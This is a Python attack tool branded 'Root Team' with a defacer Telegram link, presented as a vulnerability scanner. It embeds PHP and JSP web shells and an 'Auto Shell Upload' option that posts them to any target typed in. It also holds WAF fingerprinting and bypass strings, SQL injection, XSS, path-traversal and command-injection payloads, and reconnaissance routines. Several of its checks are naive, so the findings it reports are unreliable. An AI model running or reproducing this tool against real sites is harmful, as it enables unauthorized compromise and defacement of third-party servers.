import requests
import socket
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from termcolor import colored
import subprocess
import pyfiglet
import colorama
from colorama import Fore
import ssl

# Initializations and constants
colorama.init()
LOG_FILE = "scan_error_log.txt"
RESULTS_FILE = "scan_results.txt"
TIMEOUT = 10
HEADERS = {'User-Agent': 'Mozilla/5.0 (compatible; VulnerabilityScanner/1.0)'}

# Embedded shell codes
SHELL_CODES = {
    "php": "<?php echo shell_exec($_GET['cmd']); ?>",
    "asp": "<%@ Language=VBScript %>\n<% Response.Write(Request.ServerVariables('REMOTE_ADDR')) %>",
    "jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
}

# WAF detection payloads
WAF_DETECTION_PAYLOADS = [
    "../../../../etc/passwd",
    "<script>alert('XSS')</script>",
    "' OR '1'='1",
    "UNION SELECT NULL",
]

# WAF bypass techniques
WAF_BYPASS_TECHNIQUES = [
    "/*!50000SELECT*/",
    "UNION/*!50000SELECT*/",
    "AND 1=1",
    "AND 1=0",
]

# WAF fingerprints
WAF_FINGERPRINTS = {
    "Cloudflare": {
        "headers": {"server": "cloudflare"},
        "patterns": ["cloudflare", "cf-ray"]
    },
    "Akamai": {
        "headers": {"server": "akamai"},
        "patterns": ["akamai"]
    },
    "Imperva": {
        "headers": {"server": "imperva"},
        "patterns": ["imperva"]
    },
    "AWS WAF": {
        "headers": {"x-amz-cf-pop": ""},
        "patterns": ["aws", "waf"]
    },
    "Sucuri": {
        "headers": {"server": "sucuri"},
        "patterns": ["sucuri"]
    },
    "Barracuda": {
        "headers": {"server": "barracuda"},
        "patterns": ["barracuda"]
    },
    "Fortinet": {
        "headers": {"server": "fortinet"},
        "patterns": ["fortinet"]
    },
    "F5 BIG-IP": {
        "headers": {"server": "bigip"},
        "patterns": ["bigip"]
    },
    "ModSecurity": {
        "headers": {"server": "mod_security"},
        "patterns": ["mod_security"]
    },
}

def display_ascii_art():
    """Displays ASCII art for the tool header."""
    text = "Root Team"
    ascii_art = pyfiglet.figlet_format(text)
    print(Fore.RED + ascii_art)
    print(colored("https://t.me/rootdefacer", 'red'))

def log_error(message):
    """Logs error messages with a timestamp."""
    with open(LOG_FILE, "a", encoding="utf-8") as log_file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_file.write(f"[{timestamp}] {message}\n")

def log_result(message):
    """Logs scan results with a timestamp."""
    with open(RESULTS_FILE, "a", encoding="utf-8") as results_file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        results_file.write(f"[{timestamp}] {message}\n")

def ensure_url_scheme(url):
    """Ensures that the URL contains the http/https scheme."""
    parsed = urlparse(url)
    if not parsed.scheme:
        return "http://" + url
    return url

def gather_target_info(domain):
    """Gathers detailed information about the target domain."""
    print(colored("[*] Gathering detailed target information...", 'yellow'))
    
    # Resolve main domain IP
    try:
        ip = socket.gethostbyname(domain)
        print(colored(f"[+] Domain {domain} resolved to IP: {ip}", 'green'))
    except Exception as e:
        print(colored(f"[!] Failed to resolve domain {domain}: {str(e)}", 'red'))
        log_error(f"Failed to resolve domain {domain}: {str(e)}")
    
    # Get HTTP headers
    url = "http://" + domain
    try:
        response = requests.get(url, timeout=TIMEOUT, headers=HEADERS)
        print(colored(f"[+] HTTP Status Code: {response.status_code}", 'green'))
        print(colored("[+] HTTP Response Headers:", 'green'))
        for header, value in response.headers.items():
            print(colored(f"    {header}: {value}", 'green'))
    except Exception as e:
        print(colored(f"[!] Failed to fetch HTTP info for {domain}: {str(e)}", 'red'))
        log_error(f"Failed to fetch HTTP info for {domain}: {str(e)}")
    
    # WHOIS lookup
    try:
        result = subprocess.check_output(["which", "whois"], stderr=subprocess.PIPE, universal_newlines=True)
        if result.strip():
            whois_result = subprocess.check_output(["whois", domain], stderr=subprocess.PIPE, universal_newlines=True)
            whois_lines = whois_result.splitlines()
            print(colored("[+] WHOIS Information (first 20 lines):", 'green'))
            for line in whois_lines[:20]:
                print(colored(line, 'green'))
        else:
            print(colored("[!] WHOIS lookup failed: 'whois' command not found", 'red'))
            log_error(f"WHOIS lookup failed for {domain}: 'whois' command not found.")
    except subprocess.CalledProcessError as e:
        print(colored(f"[!] WHOIS lookup failed for {domain}: {str(e)}", 'red'))
        log_error(f"WHOIS lookup failed for {domain}: {str(e)}")

def check_ssl_cert(domain):
    """Checks the SSL certificate of the domain."""
    print(colored("[*] Checking SSL certificate...", 'yellow'))
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                print(colored(f"[+] SSL Certificate for {domain} is valid.", 'green'))
                print(colored(f"    Issuer: {cert['issuer']}", 'green'))
                print(colored(f"    Valid From: {cert['notBefore']}", 'green'))
                print(colored(f"    Valid Until: {cert['notAfter']}", 'green'))
    except Exception as e:
        print(colored(f"[!] SSL Certificate check failed for {domain}: {str(e)}", 'red'))
        log_error(f"SSL Certificate check failed for {domain}: {str(e)}")

def scan_ports(domain, ports):
    """Scans specified ports on the target domain."""
    print(colored("[*] Scanning ports...", 'yellow'))
    open_ports = []
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(TIMEOUT)
            result = sock.connect_ex((domain, port))
            if result == 0:
                open_ports.append(port)
                print(colored(f"[+] Port {port} is open.", 'green'))
            else:
                print(colored(f"[-] Port {port} is closed.", 'red'))
    if open_ports:
        log_result(f"Open ports on {domain}: {', '.join(map(str, open_ports))}")
    else:
        print(colored("[+] No open ports found.", 'green'))

def auto_shell_upload(target):
    """Attempts to upload embedded shells to the target."""
    print(colored("[*] Attempting to upload shells...", 'yellow'))
    
    for shell_type, shell_code in SHELL_CODES.items():
        print(colored(f"[*] Trying to upload {shell_type} shell...", 'yellow'))
        try:
            files = {'file': (f"shell.{shell_type}", shell_code, f'text/{shell_type}')}
            response = requests.post(target, files=files, timeout=TIMEOUT)
            
            if response.status_code == 200:
                print(colored(f"[+] {shell_type} shell uploaded successfully!", 'green'))
                log_result(f"{shell_type} shell uploaded to {target}")
                return True
            else:
                print(colored(f"[-] Failed to upload {shell_type} shell. Status code: {response.status_code}", 'red'))
        except Exception as e:
            print(colored(f"[!] Error uploading {shell_type} shell: {str(e)}", 'red'))
            log_error(f"Error uploading {shell_type} shell: {str(e)}")
    
    print(colored("[!] All shell upload attempts failed.", 'red'))
    return False

def detect_waf(target):
    """Detects if a WAF is present on the target and identifies its type."""
    print(colored("[*] Detecting WAF...", 'yellow'))
    
    try:
        response = requests.get(target, timeout=TIMEOUT)
        headers = response.headers
        content = response.text.lower()

        for waf_name, fingerprint in WAF_FINGERPRINTS.items():
            # Check headers
            header_match = True
            for header_key, header_value in fingerprint["headers"].items():
                if header_key not in headers:
                    header_match = False
                    break
                if header_value and header_value.lower() not in headers[header_key].lower():
                    header_match = False
                    break
            
            # Check content patterns
            pattern_match = any(pattern in content for pattern in fingerprint["patterns"])
            
            if header_match or pattern_match:
                print(colored(f"[!] WAF detected: {waf_name}", 'red'))
                log_result(f"WAF detected on {target}: {waf_name}")
                return waf_name
        
        # If no WAF is detected based on headers or content, try payload-based detection
        for payload in WAF_DETECTION_PAYLOADS:
            response = requests.get(target, params={"test": payload}, timeout=TIMEOUT)
            if response.status_code == 403 or "blocked" in response.text.lower():
                print(colored(f"[!] WAF detected (unknown type) with payload: {payload}", 'red'))
                log_result(f"WAF detected on {target} with payload: {payload}")
                return "Unknown WAF"
        
        print(colored("[+] No WAF detected.", 'green'))
        return None
    except Exception as e:
        print(colored(f"[!] Error detecting WAF: {str(e)}", 'red'))
        log_error(f"Error detecting WAF: {str(e)}")
        return None

def bypass_waf(target):
    """Attempts to bypass WAF using various techniques."""
    print(colored("[*] Attempting to bypass WAF...", 'yellow'))
    for technique in WAF_BYPASS_TECHNIQUES:
        try:
            response = requests.get(target, params={"test": technique}, timeout=TIMEOUT)
            if response.status_code == 200:
                print(colored(f"[+] WAF bypassed with technique: {technique}", 'green'))
                log_result(f"WAF bypassed on {target} with technique: {technique}")
                return True
        except Exception as e:
            print(colored(f"[!] Error bypassing WAF: {str(e)}", 'red'))
            log_error(f"Error bypassing WAF: {str(e)}")
    print(colored("[!] WAF bypass attempts failed.", 'red'))
    return False

class VulnerabilityScanner:
    def __init__(self, base_url):
        self.base_url = ensure_url_scheme(base_url)
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.found_vulnerabilities = []  # Detected vulnerabilities will be stored here

    def safe_request(self, url, method='GET', data=None, files=None, headers=None):
        """Performs HTTP requests with error handling."""
        try:
            if method.upper() == 'POST':
                response = self.session.post(url, data=data, files=files, headers=headers, timeout=TIMEOUT)
            else:
                response = self.session.get(url, headers=headers, timeout=TIMEOUT)
            response.raise_for_status()  # Raise HTTP errors
            return response
        except requests.exceptions.Timeout:
            log_error(f"Timeout occurred for URL {url}")
        except requests.exceptions.ConnectionError:
            log_error(f"Connection error occurred for URL {url}")
        except requests.exceptions.RequestException as e:
            log_error(f"Request exception for URL {url}: {str(e)}")
        return None

    def test_file_upload(self):
        """Tests for file upload vulnerabilities."""
        print(colored("[*] Testing for File Upload Vulnerability...", 'yellow'))

        file_path = os.path.join(os.getcwd(), "malicious_file.php")
        try:
            if os.path.exists(file_path):
                files = {'file': (file_path, open(file_path, 'rb'), 'application/x-php')}
                response = self.safe_request(self.base_url, method="POST", files=files)
                if response and response.status_code == 200 and "Upload successful" in response.text:
                    message = f"[!] File upload vulnerability detected. Malicious file uploaded to {self.base_url}"
                    print(colored(message, 'red'))
                    log_result(message)
                    self.found_vulnerabilities.append(("File Upload Vulnerability", file_path, self.base_url))
                else:
                    print(colored("[+] No file upload vulnerability detected.", 'green'))
            else:
                print(colored("[!] No malicious file found for upload test.", 'yellow'))
        except Exception as e:
            print(colored(f"[!] Error during file upload test: {str(e)}", 'red'))
            log_error(f"Error during file upload test: {str(e)}")

    def test_command_injection(self):
        """Tests for command injection vulnerabilities."""
        print(colored("[*] Testing for Command Injection Vulnerability...", 'yellow'))
        url = self.base_url + "/?id=1;ls"
        response = self.safe_request(url)
        if response and "ls" in response.text:
            print(colored(f"[!] Command Injection detected at {url}", 'red'))
            log_result(f"Command Injection detected at {url}")
            self.found_vulnerabilities.append(("Command Injection", url, self.base_url))
        else:
            print(colored("[+] No Command Injection vulnerability detected.", 'green'))

    def test_sql_injection(self):
        """Tests for SQL Injection vulnerabilities."""
        print(colored("[*] Testing for SQL Injection Vulnerability...", 'yellow'))
        url = self.base_url + "/?id=1' OR '1'='1"
        response = self.safe_request(url)
        if response and "error" in response.text.lower():
            print(colored(f"[!] SQL Injection detected at {url}", 'red'))
            log_result(f"SQL Injection detected at {url}")
            self.found_vulnerabilities.append(("SQL Injection", url, self.base_url))
        else:
            print(colored("[+] No SQL Injection vulnerability detected.", 'green'))

    def test_xss(self):
        """Tests for Cross-Site Scripting (XSS) vulnerabilities."""
        print(colored("[*] Testing for XSS Vulnerability...", 'yellow'))
        url = self.base_url + "/?search=<script>alert('XSS')</script>"
        response = self.safe_request(url)
        if response and "<script>alert('XSS')</script>" in response.text:
            print(colored(f"[!] XSS vulnerability detected at {url}", 'red'))
            log_result(f"XSS vulnerability detected at {url}")
            self.found_vulnerabilities.append(("XSS", url, self.base_url))
        else:
            print(colored("[+] No XSS vulnerability detected.", 'green'))

    def run_all_tests(self, detailed=True):
        """Runs all security tests. The 'detailed' parameter sets the scope of testing."""
        tests = []
        with ThreadPoolExecutor(max_workers=6) as executor:
            if detailed:
                tests.append(executor.submit(self.test_command_injection))
                tests.append(executor.submit(self.test_sql_injection))
                tests.append(executor.submit(self.test_xss))
                tests.append(executor.submit(self.test_file_upload))  # Add file upload test
            for future in as_completed(tests):
                try:
                    future.result()
                except Exception as e:
                    log_error(f"Error during test execution: {str(e)}")
        
        # WAF detection and bypass
        if detailed:
            waf_type = detect_waf(self.base_url)
            if waf_type:
                print(colored(f"[*] Detected WAF: {waf_type}", 'yellow'))
                if bypass_waf(self.base_url):
                    print(colored(f"[+] WAF bypassed: {waf_type}", 'green'))
                else:
                    print(colored(f"[!] Failed to bypass WAF: {waf_type}", 'red'))
        
        self.print_summary()

    def print_summary(self):
        """Displays a summary report at the end of the tests."""
        print("\n" + colored("Scan Summary:", 'cyan'))
        if self.found_vulnerabilities:
            for vuln, payload, url in self.found_vulnerabilities:
                print(colored(f"{vuln} vulnerability detected with payload '{payload}' at {url}", 'red'))
        else:
            print(colored("No vulnerabilities detected.", 'green'))

def enumerate_subdomains(domain):
    """Determines known subdomains for a given domain using DNS queries."""
    print(colored("[*] Enumerating subdomains...", 'yellow'))
    subdomains = ["www", "mail", "ftp", "dev", "test", "api", "blog", "shop", "admin", "secure"]
    found_subdomains = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_sub = {executor.submit(socket.gethostbyname, f"{sub}.{domain}"): sub for sub in subdomains}
        for future in as_completed(future_to_sub):
            sub = future_to_sub[future]
            try:
                ip = future.result()
                subdomain = f"{sub}.{domain}"
                found_subdomains.append((subdomain, ip))
                print(colored(f"[+] Found subdomain: {subdomain} ({ip})", 'green'))
            except socket.gaierror:
                log_error(f"Failed to resolve subdomain {sub}.{domain}")
                continue
            except Exception as e:
                log_error(f"Error resolving subdomain {sub}.{domain}: {str(e)}")
    if not found_subdomains:
        print(colored("[+] No subdomains found.", 'green'))
    return found_subdomains

def main_menu():
    display_ascii_art()

    while True:
        print("\n[+] Select a scan type:")
        print(colored("1 - Detailed Scan (Extensive vulnerability tests)", 'cyan'))
        print(colored("2 - Information Gathering Scan (Detailed target info & subdomains)", 'cyan'))
        print(colored("3 - Normal Scan (Basic vulnerabilities)", 'cyan'))
        print(colored("4 - SSL Certificate Check", 'cyan'))
        print(colored("5 - Port Scan", 'cyan'))
        print(colored("6 - Auto Shell Upload", 'cyan'))
        print(colored("7 - Exit", 'red'))

        choice = input(colored("\n[?] Enter your choice: ", 'cyan')).strip()

        if choice == "7":
            print(colored("[+] Exiting...", 'yellow'))
            break

        target = input(colored("[?] Enter URL to scan (e.g., example.com): ", 'cyan')).strip()
        scanner = VulnerabilityScanner(target)

        if choice == "1":
            print(colored("[*] Performing Detailed Scan...", 'yellow'))
            scanner.run_all_tests(detailed=True)
        elif choice == "2":
            print(colored("[*] Performing Information Gathering Scan...", 'yellow'))
            gather_target_info(target)
            subdomains = enumerate_subdomains(target)
        elif choice == "3":
            print(colored("[*] Performing Normal Scan...", 'yellow'))
            scanner.run_all_tests(detailed=False)
        elif choice == "4":
            check_ssl_cert(target)
        elif choice == "5":
            ports = [22, 80, 443, 8080 , 3306, 5432]  # Common ports to scan
            scan_ports(target, ports)
        elif choice == "6":
            auto_shell_upload(target)
        else:
            print(colored("[!] Invalid option selected. Please choose again.", 'red'))

if __name__ == "__main__":
    main_menu()